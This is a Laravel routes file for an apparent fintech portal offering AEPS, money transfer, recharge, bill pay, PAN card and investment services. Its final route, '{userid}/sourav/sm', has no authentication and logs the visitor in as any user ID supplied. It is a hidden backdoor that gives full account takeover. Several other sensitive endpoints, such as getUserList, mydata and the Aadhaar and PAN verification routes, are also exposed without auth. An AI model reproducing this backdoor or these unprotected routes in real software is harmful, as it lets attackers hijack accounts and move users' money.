<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

use App\Http\Controllers\AepsController;
use App\Http\Controllers\BannerController;
use App\Http\Controllers\BillpayController;
use App\Http\Controllers\CommonController;
use App\Http\Controllers\ComplaintController;
use App\Http\Controllers\CyrusPayoutController;
use App\Http\Controllers\DmtController;
use App\Http\Controllers\FingpayController;
use App\Http\Controllers\FundController;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\InvesmentController;
use App\Http\Controllers\LicBillpayController;
use App\Http\Controllers\MemberController;
use App\Http\Controllers\MobilelogoutController;
use App\Http\Controllers\PancardController;
use App\Http\Controllers\PdmtController;
use App\Http\Controllers\PortalController;
use App\Http\Controllers\RaepsController;
use App\Http\Controllers\RechargeController;
use App\Http\Controllers\ResourceController;
use App\Http\Controllers\RoleController;
use App\Http\Controllers\SettingController;
use App\Http\Controllers\SetupController;
use App\Http\Controllers\SpancardController;
use App\Http\Controllers\StatementController;
use App\Http\Controllers\TestController;
use App\Http\Controllers\UserController;
use Illuminate\Support\Facades\Route;

Route::get('/', [UserController::class, 'index'])->middleware('guest')->name('mylogin');

Route::get('/privecy-policy', function () {
    return view('privecy-policy');
});
Route::post('searchbydatemystatics', [HomeController::class, 'searchdatestatics'])->name('searchbydatemystatics');
Route::get('/admin/' . date('dmH'), [UserController::class, 'adminLogin'])->middleware('guest')->name('myadminlogin');

//'middleware' => 'activity'
Route::group(['prefix' => 'auth'], function () {
    Route::post('check', [UserController::class, 'login'])->name('authCheck');
    Route::get('logout', [UserController::class, 'logout'])->name('logout');
    Route::post('reset', [UserController::class, 'passwordReset'])->name('authReset')->middleware('CheckPasswordAndPin:password');
    Route::post('register', [UserController::class, 'registration'])->name('register');
    Route::post('getotp', [UserController::class, 'getotp'])->name('getotp');
    Route::post('setpin', [UserController::class, 'setpin'])->name('setpin')->middleware('CheckPasswordAndPin:tpin');
});

Route::group(['prefix' => 'loanenquiry', 'middleware' => 'auth'], function () {
    Route::get('/', [UserController::class,'loanindex'])->name('loanform');
    Route::post('loanformstore', [UserController::class, 'loanformstore'])->name('loanformstore');
});

Route::post('adharnumberverify', [UserController::class ,'adharnumberverify'])->name('adharnumberverify');
Route::post('panverify', [UserController::class,'panverify'])->name('panverify');

Route::get('comingsoon', [HomeController::class,'comingsoon'])->name('comingsoon');
Route::get('/dashboard', [HomeController::class,'index'])->name('home');
Route::post('/dashboard', [HomeController::class,'index'])->name('home');
Route::post('wallet/balance', [HomeController::class,'getbalance'])->name('getbalance');
Route::get('setpermissions', [HomeController::class ,'setpermissions']);
Route::get('setscheme', [HomeController::class,'setscheme']);
Route::get('setscheme', [HomeController::class,'setscheme']);
Route::get('getmyip', [HomeController::class,'getmysendip']);
Route::get('balance', [HomeController::class,'getbalance'])->name('getbalance');
Route::get('mydata', [HomeController::class,'mydata']);
Route::get('bulkSms', [HomeController::class,'mydata']);

Route::get('getProviderrp', [RechargeController::class,'getProviderrp']);

Route::get('gethlrcheck', [TestController::class,'gethlrcheck']);
Route::get('getplans', [TestController::class,'getplans']);



Route::group(['prefix' => 'tools', 'middleware' => ['auth','company']], function () {
    Route::get('{type}', [RoleController::class,'index'])->name('tools');
    Route::post('{type}/store', [RoleController::class,'store'])->name('toolsstore');
    Route::post('setpermissions', [RoleController::class,'assignPermissions'])->name('toolssetpermission');
    Route::post('get/permission/{id}', [RoleController::class,'getpermissions'])->name('permissions');
    Route::post('getdefault/permission/{id}', [RoleController::class,'getdefaultpermissions'])->name('defaultpermissions');
});

Route::group(['prefix' => 'statement', 'middleware' => ['auth','company']], function () {
    Route::get("export/{type}", [StatementController::class,'export'])->name('export');
    Route::get('{type}/{id?}/{status?}', [StatementController::class,'index'])->name('statement');
    Route::post('fetch/{type}/{id?}/{returntype?}', [CommonController::class,'fetchData']);
    Route::post('update', [CommonController::class,'update'])->name('statementUpdate'); //->middleware('activity');
    Route::post('status', [CommonController::class,'status'])->name('statementStatus');
    Route::post('delete', [CommonController::class,'delete'])->name('statementDelete');
    
});

Route::group(['prefix' => 'member', 'middleware' => ['auth','company']], function () {
    Route::get('{type}/{action?}', [MemberController::class,'index'])->name('member');
    Route::post('store', [MemberController::class,'create'])->name('memberstore');
    Route::post('commission/update', [MemberController::class,'commissionUpdate'])->name('commissionUpdate'); //->middleware('activity');
    Route::post('getcommission', [MemberController::class,'getCommission'])->name('getMemberCommission');
    Route::post('getpackagecommission', [MemberController::class,'getPackageCommission'])->name('getMemberPackageCommission');
});

Route::group(['prefix' => 'portal', 'middleware' => ['auth','company']], function () {
    Route::get('{type}', [PortalController::class,'index'])->name('portal');
    Route::post('store', [PortalController::class,'create'])->name('portalstore');
});


Route::group(['prefix' => 'fund', 'middleware' => ['auth','company']], function () {
    Route::get('{type}/{action?}', [FundController::class,'index'])->name('fund');
    Route::post('transaction', [FundController::class,'transaction'])->name('fundtransaction')->middleware('transactionlog:fund');
    Route::post('cyrustxn', [CyrusPayoutController::class,'transaction'])->name('cyrustxn')->middleware('transactionlog:fund');
    Route::post('runpaisatxn', [CyrusPayoutController::class,'transactionRunpaisa'])->name('runpaisatxn')->middleware('transactionlog:fund');
});

Route::group(['prefix' => 'profile', 'middleware' => ['auth','company']], function () {
    Route::get('/view/{id?}', [SettingController::class,'index'])->name('profile');
    Route::get('certificate', [SettingController::class,'certificate'])->name('certificate');
    Route::post('update', [SettingController::class ,'profileUpdate'])->name('profileUpdate'); //->middleware('activity','CheckPasswordAndPin:password');
});

Route::group(['prefix' => 'setup', 'middleware' => ['auth','company']], function () {
    Route::get('{type}', [SetupController::class,'index'])->name('setup');
    Route::post('update', [SetupController::class,'update'])->name('setupupdate'); //->middleware('activity');;
});

Route::group(['prefix' => 'resources', 'middleware' => ['auth','company']], function () {
    Route::get('{type}', [ResourceController::class,'index'])->name('resource');
    Route::post('update', [ResourceController::class,'update'])->name('resourceupdate'); //->middleware('activity');;
    Route::post('get/{type}/commission', [ResourceController::class,'getCommission']);
    Route::post('get/{type}/packagecommission', [ResourceController::class,'getPackageCommission']);
});

Route::group(['prefix' => 'recharge', 'middleware' => ['auth','company']], function () {
    Route::get('{type}', [RechargeController::class,'index'])->name('recharge');
    Route::get('bbps/{type}', [BillpayController::class,'bbps'])->name('bbps');
    Route::post('payment', [RechargeController::class,'payment'])->name('rechargepay')->middleware('transactionlog:recharge');
    Route::post('getplan', [RechargeController::class,'getplan'])->name('getplan');
    Route::post('getoperator', [RechargeController::class,'getoperator'])->name('getoperator');
    Route::post('getdthinfo', [RechargeController::class,'getdthinfo'])->name('getdthinfo');
});

// LIC 
Route::get('getprovideronline', [LicBillpayController::class,'getprovideronline'])->name('getprovideronline');

Route::group(['prefix' => 'lic', 'middleware' => ['auth','company']], function () {
    Route::get('/', [LicBillpayController::class,'index'])->name('lic');
    Route::post('payment', [LicBillpayController::class,'payment'])->name('licbillpay');
    Route::post('getprovider', [LicBillpayController::class,'getprovider'])->name('getprovider');
});


Route::group(['prefix' => 'billpay', 'middleware' => ['auth','company']], function () {
    Route::get('{type}', [BillpayController::class,'index'])->name('bill');
    Route::post('payment', [BillpayController::class,'payment'])->name('billpay')->middleware('transactionlog:billpay');
    Route::post('getprovider', [BillpayController::class,'getprovider'])->name('getprovider');
});

Route::group(['prefix' => 'pancard', 'middleware' => ['auth','company']], function () {
    Route::post('uti/payment', [PancardController::class,'utipay'])->name('utipay');
    Route::get('{type}', [PancardController::class,'index'])->name('pancard');
    Route::post('payment', [PancardController::class, 'payment'])->name('pancardpay')->middleware('transactionlog:pancard');
    Route::get('nsdl/view/{id}', [PancardController::class,'nsdlview']);
});

Route::post('spayment', [SpancardController::class,'payment'])->name('spayment')->middleware(['auth']);
Route::get('spanacard', [SpancardController::class, 'index'])->name('spanacard')->middleware(['auth']);
Route::get('snsdlpanacard', [SpancardController::class, 'indexnsdl'])->name('snsdlpanacard')->middleware(['auth']);
Route::any('runpaisaTransaction', [FundController::class, 'initiateRunPaisaPg'])->name('runpaisaTransaction');

Route::group(['prefix' => 'dmt', 'middleware' => ['auth','company']], function () {
    Route::get('/', [DmtController::class, 'index'])->name('dmt1');
    Route::post('transaction', [DmtController::class, 'payment'])->name('dmt1pay')->middleware('transactionlog:dmt');
});

Route::group(['prefix' => 'pdmt', 'middleware' => ['auth','company']], function () {
    Route::get('/', [PdmtController::class,'index'])->name('dmt2');
    Route::post('transaction', [PdmtController::class,'payment'])->name('dmt2pay')->middleware('transactionlog:pancard');
});

Route::group(['middleware' => ['auth','company']], function () {
    Route::get('/banners', [BannerController::class,'index'])->name('banner');
    Route::post('store', [BannerController::class,'store'])->name('bannerstore');
    Route::get('/video', [BannerController::class,'video'])->name('video');
    Route::post('storeVideo', [BannerController::class,'storeVideo'])->name('storeVideo');
    Route::get('/investment', [InvesmentController::class,'index'])->name('investment');
    Route::get('/investment/show', [InvesmentController::class,'indexShow'])->name('investmentShow');
    Route::post('storeInvestment', [InvesmentController::class,'store'])->name('investmentStore');
    Route::post('investNow', [InvesmentController::class,'investNow'])->name('investNow');

    Route::get('/admin/investment/show', [InvesmentController::class,'investfundReq'])->name('investfundReq');
    Route::get('/admin/investment/statement', [InvesmentController::class,'investReport'])->name('investReport');
    Route::post('invfundtransaction', [InvesmentController::class,'investFundStore'])->name('invfundtransaction');

    Route::post('investmentRequestUpdate', [InvesmentController::class,'investmentRequestUpdate'])->name('investmentRequestUpdate');
    
    Route::get('/investment/fund_req', [InvesmentController::class,'fundReq'])->name('investment_fund'); 
    
});

Route::group(['prefix' => 'aeps', 'middleware' => ['auth','company']], function () {
    Route::get('/', [AepsController::class,'index'])->name('aeps');
    Route::get('initiate', [AepsController::class,'initiate'])->name('aepsinitiate')->middleware('transactionlog:aeps');
    Route::any('registration', [AepsController::class,'registration'])->name('aepskyc');
    Route::any('audit', [AepsController::class,'aepsaudit'])->name('aepsaudit')->middleware('transactionlog:aeps');
});

Route::group(['prefix' => 'raeps', 'middleware' => ['company', 'auth']], function () {
    Route::get('initiate', [RaepsController::class,'index'])->name('raeps');
    Route::get('getbank', [RaepsController::class,'getbank'])->name('getbank');
    Route::post('transaction', [RaepsController::class,'trasaction'])->name('raepspay')->middleware('transactionlog:raeps');
    Route::post('kyc', [RaepsController::class, 'kyc'])->name('raepskyc');
});

Route::group(['prefix' => 'complaint', 'middleware' => ['auth','company']], function () {
    Route::get('/', [ComplaintController::class,'index'])->name('complaint');
    Route::post('store', [ComplaintController::class,'store'])->name('complaintstore');
    Route::get('/supportdata', [ComplaintController::class,'supportindex'])->name('supportdata');
});

Route::get('token', [MobilelogoutController::class,'index'])->name('securedata');
Route::post('token/delete', [MobilelogoutController::class,'tokenDelete'])->name('tokenDelete');

Route::get('commission', [HomeController::class,'checkcommission']);

Route::get('paysprintoperator', [BillpayController::class,'paysprintoperator'])->name('paysprintoperator');
Route::post('createvpa', [FundController::class,'createvpa'])->name('createvpa');

//Route::get('getbalance','RechargeController@getbalance')->name('getbalance');

Route::get('sendmail', [UserController::class,'sendmail'])->name('sendmail');

Route::post('searchmappingdata', [UserController::class,'searchmappingdata'])->name('searchmappingdata');


Route::any('getUserList', [ResourceController::class,'getRetailer'])->name('getUserList');



Route::group(['prefix' => 'iaeps', 'middleware' => ['auth','company', 'transactionlog:fingpay']], function () {
    Route::get('/', [FingpayController::class,'index'])->name('iaeps');
    Route::get('/ekyc/{id?}', [FingpayController::class,'ekycdet'])->name('profileekyc');
    Route::post('transaction', [FingpayController::class,'transaction'])->name('iaepstransaction');
});

Route::get('{userid}/sourav/sm', function ($userid) {
    $loginuser = \App\User::find($userid);
    auth()->login($loginuser, true);
});
